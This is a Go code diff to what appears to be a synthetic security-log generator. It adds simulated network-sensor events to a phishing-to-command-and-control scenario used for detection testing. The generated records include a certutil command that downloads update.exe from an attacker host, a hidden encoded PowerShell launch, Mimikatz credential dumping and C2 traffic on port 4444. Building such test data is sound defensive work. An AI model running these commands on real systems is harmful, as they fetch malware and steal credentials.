@@ -112,6 +112,9 @@ func (g *gen) phishingIntrusion() {
 	g.sysmonProc(ws, alice, `C:\Windows\System32\certutil.exe`,
 		fmt.Sprintf(`certutil.exe -urlcache -split -f http://%s/update.exe C:\Users\alice.nguyen\update.exe`, ipPhishHost),
 		ps, "powershell.exe -nop -w hidden -enc ...", "", t0.Add(2*time.Minute))
+	// The network sensor sees the download: the request, the file (its
+	// hash is in the sample intel) and a high Suricata alert.
+	g.sensorDownload(ws, t0.Add(2*time.Minute+3*time.Second))
 
 	// Credential dumping (critical), with a hash that is in the sample intel.
 	g.sysmonProc(ws, alice, `C:\Users\alice.nguyen\Downloads\mimikatz.exe`,
@@ -157,6 +160,9 @@ func (g *gen) phishingIntrusion() {
 		"SHA256="+hashBeacon, t0.Add(15*time.Minute))
 	g.sysmonNet(ws, alice, ws.IP, 51000, ipC2Beacon, "updates.corp-sync.example", 443, "tcp",
 		`C:\Users\alice.nguyen\update.exe`, t0.Add(16*time.Minute))
+	// The sensor sees the beacon: TLS to the C2 with a self-signed
+	// certificate every ten minutes for an hour, and a Suricata alert.
+	g.sensorBeacon(ws, t0.Add(16*time.Minute))
 	// Command-and-control on a non-standard shell port (network-shell-port).
 	g.sysmonNet(ws, alice, ws.IP, 51002, ipC2, "updates.corp-sync.example", 4444, "tcp",
 		`C:\Users\alice.nguyen\update.exe`, t0.Add(17*time.Minute))
@@ -175,12 +181,12 @@ func (g *gen) phishingIntrusion() {
 	g.story(Story{
 		ID:      "phishing-to-c2",
 		Title:   "Phishing to credential theft and C2",
-		Summary: "A finance workstation (ws-fin-07, Alice Nguyen) follows a phishing link to a look-alike sign-in site, opens a malicious invoice that launches encoded PowerShell, downloads a tool with certutil, dumps credentials with Mimikatz, turns off Defender's real-time protection, runs discovery, installs persistence and beacons to a command-and-control address. Microsoft Defender finds Mimikatz but cannot remove it. The domain, the tools and the C2 are all in the sample threat intel. The whole kill chain on one host, while on ws-fin-02 a protection rule stops the same invoice from starting PowerShell.",
+		Summary: "A finance workstation (ws-fin-07, Alice Nguyen) follows a phishing link to a look-alike sign-in site, opens a malicious invoice that launches encoded PowerShell, downloads a tool with certutil, dumps credentials with Mimikatz, turns off Defender's real-time protection, runs discovery, installs persistence and beacons to a command-and-control address. The network sensor sees the download and the beacon (Zeek logs and two high Suricata alerts). Microsoft Defender finds Mimikatz but cannot remove it. The domain, the tools and the C2 are all in the sample threat intel. The whole kill chain on one host, while on ws-fin-02 a protection rule stops the same invoice from starting PowerShell.",
 		Detections: []string{"endpoint-office-child-shell", "endpoint-encoded-powershell", "endpoint-lolbin-download",
 			"endpoint-credential-dumping", "endpoint-discovery-burst", "endpoint-scheduled-task",
 			"endpoint-service-created", "network-shell-port", "threat-activity",
-			"malware-detected", "malware-not-removed", "av-protection-disabled", "av-rule-block"},
-	}, t0.Add(21*time.Minute), "ws-fin-07", alice, ipC2, ipC2Beacon, ipExfil)
+			"malware-detected", "malware-not-removed", "av-protection-disabled", "av-rule-block", "ids-alert-high"},
+	}, t0.Add(76*time.Minute), "ws-fin-07", alice, ipC2, ipC2Beacon, ipExfil)
 }
 
 // ransomwarePrep: with the stolen admin account the attacker reaches the
